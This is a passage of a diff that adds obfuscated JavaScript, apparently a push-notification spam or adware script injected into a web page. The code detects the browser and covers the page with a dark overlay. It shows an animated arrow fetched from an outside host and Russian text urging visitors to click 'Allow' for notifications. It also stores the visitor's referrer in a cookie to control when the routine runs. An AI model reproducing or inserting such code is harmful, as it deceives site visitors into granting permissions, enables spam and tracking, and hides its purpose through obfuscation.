+                    c[f('鷳鷲鷆鷯鷲鷢鷩鷤鷗', e())]();
+            } else if (typeof c[f('鷳鷲鷁鷬鷬鷯鷷鷗', e())] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+                c[f('鷳鷲鷁鷬鷬鷯鷷鷗', e())]();
+        } else {
+            z['position'] = 'fixed';
+            z['zIndex'] = A;
+            z['top'] = '0px';
+            z['left'] = '0px';
+            z['right'] = '0px';
+            aj += '<div\x20id=\x22rb_dark_area\x22\x20style=\x22position:fixed;\x20top:0;\x20right:0;\x20bottom:0;\x20left:0;\x20background:#000;\x20opacity:0.75;\x22>\x20';
+            if (!C)
+                aj += '<div\x20style=\x22display:\x20block;position:\x20fixed;right:\x2010px;color:\x20white;font-size:\x2030px;top:\x2010px;cursor:\x20pointer;\x22\x20\x20' + f('鷯鷮鷣鷬鷩鷣鷫', e()) + '=\x22' + f('鷳鷲鷆鷯鷲鷢鷩鷤鷗', e()) + '()\x22>X</div>';
+            aj += '</div>';
+            function ar() {
+                var av;
+                if (!!c['opr'] && !!opr['addons'] || !!c['opera'] || navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷩鷮鷤鷥鷸鷏鷦', e())]('\x20OPR/') >= 0x0) {
+                    av = 'Opera';
+                } else if (typeof InstallTrigger !== 'undefined') {
+                    av = 'Firefox';
+                } else if (/constructor/i['test'](c['HTMLElement']) || function (ay) {
+                        return ay['toString']() === '[object\x20SafariRemoteNotification]';
+                    }(!c['safari'] || typeof safari !== 'undefined' && safari['pushNotification'])) {
+                    av = 'Safari';
+                } else if (![] || !!d['documentMode']) {
+                    av = 'IE';
+                    var az = !![];
+                } else if (!az && !!c['StyleMedia']) {
+                    av = 'Edge';
+                } else if (navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷩鷮鷤鷥鷸鷏鷦', e())]('\x20YaBrowser/') >= 0x0 || navigator[f('鷵鷳鷥鷲鷁鷧鷥鷮鷴', e())][f('鷩鷮鷤鷥鷸鷏鷦', e())]('\x20Yowser/') >= 0x0) {
+                    av = 'Yandex';
+                } else if (!!c['chrome'] || !!c['chrome']['webstore']) {
+                    av = 'Chrome';
+                }
+                return av;
+            }
+            var av = ar();
+            aj += '<div\x20' + f('鷣鷬鷡鷳鷳', e()) + '=\x22darkeArrow\x20' + av + '\x22><div></div></div>';
+            aj += '<style>@keyframes\x20pump\x20{0%\x20{\x20transform:\x20translateY(0);\x20}25%\x20{\x20transform:\x20translateY(-5px);\x20}75%\x20{\x20transform:\x20translateY(5px);\x20}100%\x20{\x20transform:\x20translateY(0);\x20}\x20}' + '.darkeArrow\x20{display:\x20block;font-family:\x20sans-serif;font-size:\x2024px;text-align:\x20center;position:\x20absolute;top:\x20165px;left:\x20165px;max-width:\x20350px;transform:\x20translateX(-50%);}' + '.darkeArrow\x20div\x20{display:\x20block;background:\x20url(\x22https://abc.catchandfatch.bid/images/rb_darke_arrow.png\x22)\x20no-repeat\x200\x200;height:\x20135px;width:\x20114px;' + 'margin:\x200\x20auto\x2050px;animation:\x20pump\x20.75s\x20ease-out\x200s\x20infinite;}' + '.Chrome\x20{top:\x20145px;left:\x20263px;}\x20.Firefox\x20{top:\x20140px;left:\x20365px;}\x20.Opera\x20{top:\x20125px;left:\x20280px;}' + '.Yandex\x20{top:\x20190px;left:\x20auto;right:\x20230px;transform:\x20translateX(50%);}' + '.Edge\x20{top:\x20auto;bottom:\x2080px;left:\x2050%;margin-left:\x20257px;transform:\x20scale(1,\x20-1)\x20translateX(-50%);}' + '@media(max-width:\x201000px){.Edge\x20{transform:\x20scale(1,\x20-1);margin-left:\x200;left:\x20auto;right:\x20184px;}}' + 'html[lang=\x22ru\x22]\x20.Chrome,html[lang=\x22es\x22]\x20.Chrome,html[lang=\x22fr\x22]\x20.Chrome,html[lang=\x22de\x22]\x20.Chrome\x20{left:\x20246px;}' + '@media\x20(max-width:\x20767px)\x20{\x20.darkeArrow\x20{display:\x20none;}\x20}' + '</style>';
+            aj += '<p\x20style=\x22position:\x20fixed;top:\x2050%;color:\x20#000000;\x20font-size:\x2030px;text-align:\x20center;left:\x2050%;transform:\x20translate(-50%,-50%);max-width:\x20360px;line-height:\x201.3;background:\x20#dfdfdf;font-weight:bold;padding:\x2020px;\x22>\x20Нажмите\x20&quot;Разрешить&quot;,\x20чтобы\x20получать\x20уведомления</p>';
+            if (aj['length'] > 0x0) {
+                y['innerHTML'] = aj;
+                B = !![];
+            }
+            N();
+        }
+    }
+    function aB() {
+        setTimeout(function () {
+            ai();
+        }, 0x0 * 0x3e8);
+    }
+    function aC(aD) {
+        var aE = d[f('鷣鷯鷯鷫鷩鷥', e())][f('鷭鷡鷴鷣鷨', e())](new RegExp('(?:^|;\x20)' + aD[f('鷲鷥鷰鷬鷡鷣鷥', e())](/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\x5c$1') + '=([^;]*)'));
+        return aE ? decodeURIComponent(aE[0x1]) : undefined;
+    }
+    function aF(aG, aH, aI = ![]) {
+        aI = aI || {};
+        var aJ = aI[f('鷥鷸鷰鷩鷲鷥鷳', e())];
+        if (typeof aJ == 'number' && aJ) {
+            var aK = new Date();
+            aK['setTime'](aK['getTime']() + aJ * 0x3e8);
+            aJ = aI[f('鷥鷸鷰鷩鷲鷥鷳', e())] = aK;
+        }
+        if (aJ && aJ['toUTCString']) {
+            aI[f('鷥鷸鷰鷩鷲鷥鷳', e())] = aJ['toUTCString']();
+        }
+        aH = encodeURIComponent(aH);
+        var aL = aG + '=' + aH;
+        for (var aM in aI) {
+            aL += ';\x20' + aM;
+            var aN = aI[aM];
+            if (aN !== !![]) {
+                aL += '=' + aN;
+            }
+        }
+        d[f('鷣鷯鷯鷫鷩鷥', e())] = aL;
+    }
+    function aO(aP) {
+        var aQ = aC(f('鷲鷢鷓鷥鷳鷳鷒鷥鷦鷐鷡鷳', e())), aR = decodeURI(location[f('鷨鷯鷳鷴鷮鷡鷭鷥', e())]);
+        if (!aQ) {
+            aS(aP);
+            aQ = aP;
+        } else if (aP[f('鷩鷮鷤鷥鷸鷏鷦', e())]('://' + aR + '/') < 0x0) {
+            aS(aP);
+            aQ = aP;
+        }
+        return aQ;
+    }
+    function aS(aT) {
+        var aU = {};
+        aU['path'] = '/';
+        aU[f('鷥鷸鷰鷩鷲鷥鷳', e())] = 0x3c * 0x3c * 0x18 * 0x1e;
+        aF(f('鷲鷢鷓鷥鷳鷳鷒鷥鷦鷐鷡鷳', e()), aT, aU);
+    }
+    function aV() {
+        var aW = d[f('鷲鷥鷦鷥鷲鷲鷥鷲', e())], aX = [{
+                    'fncNm': aB,
+                    'id': 0x3247,
+                    'desktop': 0x1,
+                    'mobile': 0x1,
+                    'rfrflkjo': {
+                        'all': 0x1,
+                        'y': [],
+                        'n': []
+                    },
+                    'rfrflkjoS': {
+                        'all': 0x1,
+                        'y': [],
+                        'n': []
+                    }
+                }], aY = [];
+        if (aW['trim']() === '')
+            aW = 'http://' + f('鷮鷯鶮鷤鷯鷭鷡鷩鷮', e()) + '/';
+        var aZ = aO(aW);
+        ad();
+        var b0 = ![], b1, b2;
+        for (var b3 = 0x0; b3 < aX[f('鷬鷥鷮鷧鷴鷨', e())]; b3++) {
+            var b4 = aX[b3];
+            b0 = ![];
+            if (x && b4['mobile'] === 0x0 || !x && b4['desktop'] === 0x0) {
+                continue;
+            } else if (b4['rfrflkjo']['all'] === 0x0) {
+                b1 = 0x0;
+                if (b4['rfrflkjo']['y'][f('鷬鷥鷮鷧鷴鷨', e())]) {
+                    for (b2 = 0x0; b2 < b4['rfrflkjo']['y'][f('鷬鷥鷮鷧鷴鷨', e())]; b2++) {
+                        if (aW[f('鷩鷮鷤鷥鷸鷏鷦', e())](b4['rfrflkjo']['y'][b2]['toLowerCase']()) >= 0x0) {
+                            b1++;
+                        }
+                    }
+                    b0 = !b1;
+                } else if (b4['rfrflkjo']['n'][f('鷬鷥鷮鷧鷴鷨', e())]) {
+                    for (b2 = 0x0; b2 < b4['rfrflkjo']['n'][f('鷬鷥鷮鷧鷴鷨', e())]; b2++) {
+                        if (aW[f('鷩鷮鷤鷥鷸鷏鷦', e())](b4['rfrflkjo']['n'][b2]['toLowerCase']()) >= 0x0) {
+                            b1++;
+                        }
+                    }
+                    b0 = !!b1;
+                } else {
+                    b0 = ![];
+                }
+            } else if (!b0 && b4['rfrflkjoS']['all'] === 0x0) {
+                b1 = 0x0;
+                if (b4['rfrflkjoS']['y'][f('鷬鷥鷮鷧鷴鷨', e())]) {
+                    for (b2 = 0x0; b2 < b4['rfrflkjoS']['y'][f('鷬鷥鷮鷧鷴鷨', e())]; b2++) {
+                        if (aZ[f('鷩鷮鷤鷥鷸鷏鷦', e())](b4['rfrflkjoS']['y'][b2]['toLowerCase']()) >= 0x0) {
+                            b1++;
+                        }
+                    }
+                    b0 = !b1;
+                } else if (b4['rfrflkjoS']['n'][f('鷬鷥鷮鷧鷴鷨', e())]) {
+                    for (b2 = 0x0; b2 < b4['rfrflkjoS']['n'][f('鷬鷥鷮鷧鷴鷨', e())]; b2++) {
+                        if (aZ[f('鷩鷮鷤鷥鷸鷏鷦', e())](b4['rfrflkjoS']['n'][b2]['toLowerCase']()) >= 0x0) {
+                            b1++;
+                        }
+                    }
+                    b0 = !!b1;
+                } else {
+                    b0 = ![];
+                }
+            }
+            if (b0) {
+                continue;
+            }
+            aY[f('鷰鷵鷳鷨', e())](b4);
+        }
+        aX = aY;
+        if (aX[f('鷬鷥鷮鷧鷴鷨', e())]) {
+            var b5 = Math['floor'](Math['random']() * aX[f('鷬鷥鷮鷧鷴鷨', e())]);
+            if (aX[b5]) {
+                w = aX[b5]['id'];
+                if (typeof aX[b5]['fncNm'] === f('鷦鷵鷮鷣鷴鷩鷯鷮', e()))
+                    aX[b5]['fncNm']();
+            }
+        }
+    }
+    if (J)
+        c['dispatchEvent'](J);
+}(window, document);
